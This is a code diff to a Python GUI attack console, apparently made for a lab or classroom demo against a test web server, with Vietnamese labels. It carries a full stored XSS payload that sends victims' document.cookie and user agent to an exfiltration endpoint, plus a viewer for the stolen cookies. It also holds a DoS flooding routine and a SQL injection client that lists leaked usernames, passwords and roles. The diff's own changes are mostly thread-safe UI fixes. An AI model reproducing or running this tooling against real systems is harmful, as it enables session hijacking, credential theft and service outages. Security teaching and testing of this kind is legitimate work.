@@ -56,6 +56,7 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
         # Số liệu thống kê DoS
         self.dos_stats = {"sent": 0, "crashed_503": 0, "dropped": 0}
         self.stats_lock = threading.Lock()
+        self._last_cookies_snapshot = None
 
         # Dựng giao diện
         self._build_header()
@@ -195,7 +196,7 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
         self.threads_lbl.pack(side="left")
 
         self.threads_slider = ctk.CTkSlider(
-            threads_box, from_=5, to=50, number_of_steps=45, width=260, command=self._update_threads_label
+            threads_box, from_=10, to=50, number_of_steps=40, width=260, command=self._update_threads_label
         )
         self.threads_slider.set(20)
         self.threads_slider.pack(side="right")
@@ -388,7 +389,7 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
         ctk.CTkLabel(row2, text="Mã độc Script XSS:", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=(0, 8))
         self.xss_entry = ctk.CTkEntry(row2, font=ctk.CTkFont(family="Consolas", size=12))
         # Payload Stored XSS sáng tạo: Vừa bật Popup trên máy Hội đồng, vừa ngầm gửi Cookie về máy Attacker!
-        payload_xss = "<script>alert('⚠️ BÁO ĐỘNG AN NINH: Phát hiện mã độc Stored XSS đang thực thi trên trình duyệt! Cookie: ' + document.cookie); fetch('/api/xss/exfiltrate?cookie=' + encodeURIComponent(document.cookie));</script>"
+        payload_xss = "<script>fetch('/api/xss/exfiltrate?cookie='+encodeURIComponent(document.cookie)+'&ua='+encodeURIComponent(navigator.userAgent)); setTimeout(()=>alert('⚠️ CẢNH BÁO AN NINH: Phát hiện kiểm thử XSS phiên trình duyệt! Token: '+document.cookie), 150);</script>"
         self.xss_entry.insert(0, payload_xss)
         self.xss_entry.pack(side="left", fill="x", expand=True, padx=4)
 
@@ -413,7 +414,7 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
             fg_color="#0284c7",
             hover_color="#0369a1",
             height=38,
-            command=self.pull_stolen_cookies
+            command=lambda: self.pull_stolen_cookies(force_refresh=True)
         )
         self.btn_pull_cookies.pack(side="right", padx=(8, 0))
 
@@ -506,8 +507,15 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
     def log_event(self, msg, level="info"):
         t_str = time.strftime("[%H:%M:%S]")
         formatted = f"{t_str} {msg}\n"
-        self.console_text.insert("end", formatted)
-        self.console_text.see("end")
+
+        def _append():
+            self.console_text.insert("end", formatted)
+            self.console_text.see("end")
+
+        if threading.current_thread() is threading.main_thread():
+            _append()
+        else:
+            self.after(0, _append)
 
     def clear_console(self):
         self.console_text.delete("1.0", "end")
@@ -530,23 +538,27 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
         def _worker():
             try:
                 url = f"{base_url}/api/health"
-                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-HealthCheck/3.0"})
+                req = urllib.request.Request(
+                    url,
+                    headers={"User-Agent": "Attacker-HealthCheck/3.0", "ngrok-skip-browser-warning": "true"}
+                )
                 t0 = time.time()
                 with urllib.request.urlopen(req, timeout=2.5) as resp:
                     lat = round((time.time() - t0) * 1000, 1)
                     data = json.loads(resp.read().decode())
                     status = data.get("status")
                     self.log_event(f"[✓] Kết nối THÀNH CÔNG! Độ trễ: {lat}ms | Trạng thái: {status}", "info")
-                    self.badge_status.configure(text=f"● ONLINE ({lat}ms)", text_color="#10b981", fg_color="#064e3b")
+                    self.after(0, lambda l=lat: self.badge_status.configure(text=f"● ONLINE ({l}ms)", text_color="#10b981", fg_color="#064e3b"))
             except urllib.error.HTTPError as e:
                 if e.code == 503:
                     self.log_event("[!] Máy chủ ĐANG BỊ SẬP (HTTP 503 Service Unavailable)! Toàn bộ worker đã cạn!", "warning")
-                    self.badge_status.configure(text="● 503 CRASHED", text_color="#fbbf24", fg_color="#78350f")
+                    self.after(0, lambda: self.badge_status.configure(text="● 503 CRASHED", text_color="#fbbf24", fg_color="#78350f"))
                 else:
-                    self.log_event(f"[-] HTTP Error: {e.code}", "danger")
+                    self.log_event(f"[-] HTTP Error: {e.code} (Kết nối bị từ chối bởi HIPS)", "danger")
+                    self.after(0, lambda: self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d"))
             except Exception as e:
                 self.log_event(f"[!] PHẢN ĐÒN TỪ MÁY CHỦ: Bị ngắt kết nối (Socket Dropped / Refused / Tarpitted: {e})", "danger")
-                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d")
+                self.after(0, lambda: self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#f87171", fg_color="#7f1d1d"))
 
         threading.Thread(target=_worker, daemon=True).start()
 
@@ -607,16 +619,17 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
                 time.sleep(1.0)
                 elapsed = time.time() - start_t
                 progress = min(elapsed / duration_sec, 1.0)
-                self.dos_pb.set(progress)
-
                 with self.stats_lock:
                     s = self.dos_stats["sent"]
                     c = self.dos_stats["crashed_503"]
                     d = self.dos_stats["dropped"]
 
-                self.kpi_sent.configure(text=str(s))
-                self.kpi_503.configure(text=str(c))
-                self.kpi_drop.configure(text=str(d))
+                self.after(0, lambda p=progress, sv=s, cv=c, dv=d: (
+                    self.dos_pb.set(p),
+                    self.kpi_sent.configure(text=str(sv)),
+                    self.kpi_503.configure(text=str(cv)),
+                    self.kpi_drop.configure(text=str(dv)),
+                ))
 
                 if d > 20 and c < 5:
                     self.log_event("[!] Phát hiện Tường lửa HIPS máy chủ đã kích hoạt chặn gói tin! Dừng dội tải sớm.", "danger")
@@ -627,31 +640,33 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
                 t.join(timeout=0.5)
 
             self.is_attacking = False
-            self.btn_start_dos.configure(state="normal")
-            self.btn_stop_dos.configure(state="disabled")
-
             with self.stats_lock:
                 final_s = self.dos_stats["sent"]
                 final_c = self.dos_stats["crashed_503"]
                 final_d = self.dos_stats["dropped"]
 
-            if final_c >= 5:
-                msg = f"✓ MINH CHỨNG THÀNH CÔNG: Web Server đã bị sập hoàn toàn ({final_c} phản hồi HTTP 503)! Hội đồng vào web sẽ thấy trang 503!"
-                self.dos_verdict_lbl.configure(text=msg, text_color="#fef08a")
-                self.dos_verdict_frame.configure(fg_color="#854d0e")
-                self.badge_status.configure(text="● SẬP WEB (503)", text_color="#fef08a", fg_color="#854d0e")
-                self.log_event(f"[✓] {msg}", "info")
-            elif final_d > 10:
-                msg = f"✗ PHẢN ĐÒN TỪ HIPS: Bạn đã bị khóa IP! Tường lửa Windows đã DROP toàn bộ {final_d} gói tin!"
-                self.dos_verdict_lbl.configure(text=msg, text_color="#fca5a5")
-                self.dos_verdict_frame.configure(fg_color="#991b1b")
-                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
-                self.log_event(f"[-] {msg}", "danger")
-            else:
-                msg = f"[*] Đã hoàn tất đợt DoS: Đã gửi {final_s} gói tin."
-                self.dos_verdict_lbl.configure(text=msg, text_color="#e2e8f0")
-                self.dos_verdict_frame.configure(fg_color="#334155")
-                self.badge_status.configure(text="● SẴN SÀNG", text_color="#10b981", fg_color="#064e3b")
+            def _finish_dos_ui():
+                self.btn_start_dos.configure(state="normal")
+                self.btn_stop_dos.configure(state="disabled")
+                if final_c >= 5:
+                    msg = f"✓ MINH CHỨNG THÀNH CÔNG: Web Server đã bị sập hoàn toàn ({final_c} phản hồi HTTP 503)! Hội đồng vào web sẽ thấy trang 503!"
+                    self.dos_verdict_lbl.configure(text=msg, text_color="#fef08a")
+                    self.dos_verdict_frame.configure(fg_color="#854d0e")
+                    self.badge_status.configure(text="● SẬP WEB (503)", text_color="#fef08a", fg_color="#854d0e")
+                    self.log_event(f"[✓] {msg}", "info")
+                elif final_d > 10:
+                    msg = f"✗ PHẢN ĐÒN TỪ HIPS: Bạn đã bị khóa IP! Tường lửa Windows đã DROP toàn bộ {final_d} gói tin!"
+                    self.dos_verdict_lbl.configure(text=msg, text_color="#fca5a5")
+                    self.dos_verdict_frame.configure(fg_color="#991b1b")
+                    self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
+                    self.log_event(f"[-] {msg}", "danger")
+                else:
+                    msg = f"[*] Đã hoàn tất đợt DoS: Đã gửi {final_s} gói tin."
+                    self.dos_verdict_lbl.configure(text=msg, text_color="#e2e8f0")
+                    self.dos_verdict_frame.configure(fg_color="#334155")
+                    self.badge_status.configure(text="● SẴN SÀNG", text_color="#10b981", fg_color="#064e3b")
+
+            self.after(0, _finish_dos_ui)
 
         threading.Thread(target=_manager, daemon=True).start()
 
@@ -670,64 +685,68 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
 
         self.log_event(f"[+] Đang phát động tấn công SQL Injection vào: {url}", "warning")
 
+        def _render_sqli_records(records, is_honeypot):
+            for widget in self.sqli_scroll.winfo_children():
+                widget.destroy()
+
+            if records:
+                self.log_event(f"[✓] SQLi THÀNH CÔNG: Đã trích xuất {len(records)} tài khoản từ CSDL máy chủ!", "info")
+                for u in records:
+                    is_new = u.get("is_new", False)
+                    row_color = "#450a0a" if is_new else ("#451a03" if is_honeypot else "#111827")
+                    row = ctk.CTkFrame(self.sqli_scroll, fg_color=row_color, height=30)
+                    row.pack(fill="x", pady=2)
+
+                    ctk.CTkLabel(row, text=str(u.get("id")), width=40, text_color="#38bdf8").pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=u.get("full_name", ""), width=200, text_color="#f8fafc", font=ctk.CTkFont(weight="bold" if is_new else "normal")).pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=u.get("username", ""), width=120, text_color="#fbbf24", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=u.get("password", ""), width=140, text_color="#ef4444" if is_new else "#94a3b8", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=u.get("role", ""), width=120, text_color="#a855f7").pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=u.get("balance", ""), width=110, text_color="#4ade80", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
+
+                    if is_new:
+                        badge = ctk.CTkLabel(row, text="🔥 [VỪA TẠO - BỊ RÒ RỈ]", text_color="#fef08a", fg_color="#991b1b", corner_radius=4, padx=6)
+                        badge.pack(side="left", fill="x", expand=True, padx=4)
+                        self.log_event(f"    🎯 [LẤY ĐƯỢC TÀI KHOẢN HỘI ĐỒNG VỪA TẠO] User: {u.get('username')} | Pass: {u.get('password')} | Vai trò: {u.get('role')}", "warning")
+                    elif is_honeypot:
+                        badge = ctk.CTkLabel(row, text="🍯 [HONEYPOT DECOY]", text_color="#fde047", fg_color="#78350f", corner_radius=4, padx=6)
+                        badge.pack(side="left", fill="x", expand=True, padx=4)
+                    else:
+                        badge = ctk.CTkLabel(row, text="Có sẵn", text_color="#94a3b8")
+                        badge.pack(side="left", fill="x", expand=True, padx=4)
+            else:
+                lbl = ctk.CTkLabel(self.sqli_scroll, text="Không có dữ liệu rò rỉ nào được trả về.", text_color="#94a3b8")
+                lbl.pack(pady=20)
+
+        def _render_sqli_blocked():
+            for widget in self.sqli_scroll.winfo_children():
+                widget.destroy()
+
+            err_frame = ctk.CTkFrame(self.sqli_scroll, fg_color="#7f1d1d", corner_radius=6)
+            err_frame.pack(fill="x", padx=10, pady=15)
+            ctk.CTkLabel(
+                err_frame,
+                text="❌ PHẢN ĐÒN TỪ HIPS MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC!\nTường lửa máy chủ (HIPS) đã chặn đứng kết nối. Gói tin bị DROP 100%!",
+                font=ctk.CTkFont(weight="bold", size=13),
+                text_color="#fecaca"
+            ).pack(padx=15, pady=12)
+
+            self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
+            self.log_event("[-] PHẢN ĐÒN TỪ MÁY CHỦ: Bạn đã bị tấn công ngược! Tường lửa HIPS đã khóa IP.", "danger")
+
         def _worker():
             try:
-                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-SQLi/3.0"})
+                req = urllib.request.Request(
+                    url,
+                    headers={"User-Agent": "Attacker-SQLi/3.0", "ngrok-skip-browser-warning": "true"}
+                )
                 with urllib.request.urlopen(req, timeout=3.5) as resp:
                     data = json.loads(resp.read().decode())
                     records = data.get("leaked_database", [])
                     is_honeypot = data.get("is_honeypot", False)
-
-                    for widget in self.sqli_scroll.winfo_children():
-                        widget.destroy()
-
-                    if records:
-                        self.log_event(f"[✓] SQLi THÀNH CÔNG: Đã trích xuất {len(records)} tài khoản từ CSDL máy chủ!", "info")
-                        for u in records:
-                            is_new = u.get("is_new", False)
-
-                            # Nếu là tài khoản Hội đồng vừa tạo -> Nổi bật màu đỏ cam rực rỡ!
-                            row_color = "#450a0a" if is_new else ("#451a03" if is_honeypot else "#111827")
-                            row = ctk.CTkFrame(self.sqli_scroll, fg_color=row_color, height=30)
-                            row.pack(fill="x", pady=2)
-
-                            ctk.CTkLabel(row, text=str(u.get("id")), width=40, text_color="#38bdf8").pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=u.get("full_name", ""), width=200, text_color="#f8fafc", font=ctk.CTkFont(weight="bold" if is_new else "normal")).pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=u.get("username", ""), width=120, text_color="#fbbf24", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=u.get("password", ""), width=140, text_color="#ef4444" if is_new else "#94a3b8", font=ctk.CTkFont(family="Consolas")).pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=u.get("role", ""), width=120, text_color="#a855f7").pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=u.get("balance", ""), width=110, text_color="#4ade80", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
-
-                            # Nhãn trạng thái
-                            if is_new:
-                                badge = ctk.CTkLabel(row, text="🔥 [VỪA TẠO - BỊ RÒ RỈ]", text_color="#fef08a", fg_color="#991b1b", corner_radius=4, padx=6)
-                                badge.pack(side="left", fill="x", expand=True, padx=4)
-                                self.log_event(f"    🎯 [LẤY ĐƯỢC TÀI KHOẢN HỘI ĐỒNG VỪA TẠO] User: {u.get('username')} | Pass: {u.get('password')} | Vai trò: {u.get('role')}", "warning")
-                            elif is_honeypot:
-                                badge = ctk.CTkLabel(row, text="🍯 [HONEYPOT DECOY]", text_color="#fde047", fg_color="#78350f", corner_radius=4, padx=6)
-                                badge.pack(side="left", fill="x", expand=True, padx=4)
-                            else:
-                                badge = ctk.CTkLabel(row, text="Có sẵn", text_color="#94a3b8")
-                                badge.pack(side="left", fill="x", expand=True, padx=4)
-                    else:
-                        lbl = ctk.CTkLabel(self.sqli_scroll, text="Không có dữ liệu rò rỉ nào được trả về.", text_color="#94a3b8")
-                        lbl.pack(pady=20)
-
-            except Exception as e:
-                for widget in self.sqli_scroll.winfo_children():
-                    widget.destroy()
-
-                err_frame = ctk.CTkFrame(self.sqli_scroll, fg_color="#7f1d1d", corner_radius=6)
-                err_frame.pack(fill="x", padx=10, pady=15)
-                ctk.CTkLabel(
-                    err_frame,
-                    text="❌ PHẢN ĐÒN TỪ HIPS MÁY CHỦ: BẠN ĐÃ BỊ TẤN CÔNG NGƯỢC!\nTường lửa máy chủ (HIPS) đã chặn đứng kết nối. Gói tin bị DROP 100%!",
-                    font=ctk.CTkFont(weight="bold", size=13),
-                    text_color="#fecaca"
-                ).pack(padx=15, pady=12)
-
-                self.badge_status.configure(text="● BỊ HIPS KHÓA", text_color="#fca5a5", fg_color="#991b1b")
-                self.log_event("[-] PHẢN ĐÒN TỪ MÁY CHỦ: Bạn đã bị tấn công ngược! Tường lửa HIPS đã khóa IP.", "danger")
+                    self.after(0, lambda r=records, h=is_honeypot: _render_sqli_records(r, h))
+            except Exception:
+                self.after(0, _render_sqli_blocked)
 
         threading.Thread(target=_worker, daemon=True).start()
 
@@ -755,34 +774,42 @@ class AttackerApp(ctk.CTk if USE_CUSTOMTKINTER else tk.Tk):
 
         threading.Thread(target=_worker, daemon=True).start()
 
-    def pull_stolen_cookies(self):
+    def pull_stolen_cookies(self, force_refresh=False):
         """Kéo danh sách Cookie cướp được từ endpoint /api/xss/stolen_cookies"""
         base_url = self.get_base_url()
         url = f"{base_url}/api/xss/stolen_cookies"
 
+        def _render_cookies(cookies):
+            for widget in self.xss_cookie_scroll.winfo_children():
+                widget.destroy()
+
+            if cookies:
+                self.log_event(f"[🎯 XSS SUCCESS] Đã thu thập được {len(cookies)} Cookie phiên từ Hội Đồng!", "info")
+                for ck in cookies:
+                    row = ctk.CTkFrame(self.xss_cookie_scroll, fg_color="#1e1b4b", height=30)
+                    row.pack(fill="x", pady=2)
+
+                    ctk.CTkLabel(row, text=ck.get("timestamp", ""), width=90, text_color="#a5b4fc").pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=ck.get("victim_ip", ""), width=150, text_color="#38bdf8", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=ck.get("cookie", ""), width=280, text_color="#f43f5e", font=ctk.CTkFont(family="Consolas", weight="bold")).pack(side="left", padx=4)
+                    ctk.CTkLabel(row, text=ck.get("user_agent", "")[:60], text_color="#cbd5e1", font=ctk.CTkFont(size=10)).pack(side="left", fill="x", expand=True, padx=4)
+            else:
+                lbl = ctk.CTkLabel(self.xss_cookie_scroll, text="Chưa có Cookie nào được gửi về.", text_color="#94a3b8")
+                lbl.pack(pady=20)
+
         def _worker():
             try:
-                req = urllib.request.Request(url, headers={"User-Agent": "Attacker-CookieMonitor/3.0"})
+                req = urllib.request.Request(
+                    url,
+                    headers={"User-Agent": "Attacker-CookieMonitor/3.0", "ngrok-skip-browser-warning": "true"}
+                )
                 with urllib.request.urlopen(req, timeout=2.5) as resp:
                     data = json.loads(resp.read().decode())
                     cookies = data.get("stolen_cookies", [])
-
-                    for widget in self.xss_cookie_scroll.winfo_children():
-                        widget.destroy()
-
-                    if cookies:
-                        self.log_event(f"[🎯 XSS SUCCESS] Đã thu thập được {len(cookies)} Cookie phiên từ Hội Đồng!", "info")
-                        for ck in cookies:
-                            row = ctk.CTkFrame(self.xss_cookie_scroll, fg_color="#1e1b4b", height=30)
-                            row.pack(fill="x", pady=2)
-
-                            ctk.CTkLabel(row, text=ck.get("timestamp", ""), width=90, text_color="#a5b4fc").pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=ck.get("victim_ip", ""), width=150, text_color="#38bdf8", font=ctk.CTkFont(weight="bold")).pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=ck.get("cookie", ""), width=280, text_color="#f43f5e", font=ctk.CTkFont(family="Consolas", weight="bold")).pack(side="left", padx=4)
-                            ctk.CTkLabel(row, text=ck.get("user_agent", "")[:60], text_color="#cbd5e1", font=ctk.CTkFont(size=10)).pack(side="left", fill="x", expand=True, padx=4)
-                    else:
-                        lbl = ctk.CTkLabel(self.xss_cookie_scroll, text="Chưa có Cookie nào được gửi về.", text_color="#94a3b8")
-                        lbl.pack(pady=20)
+                    snapshot = json.dumps([(c.get("victim_ip"), c.get("cookie")) for c in cookies])
+                    if force_refresh or snapshot != self._last_cookies_snapshot:
+                        self._last_cookies_snapshot = snapshot
+                        self.after(0, lambda c=cookies: _render_cookies(c))
             except Exception:
                 pass
 
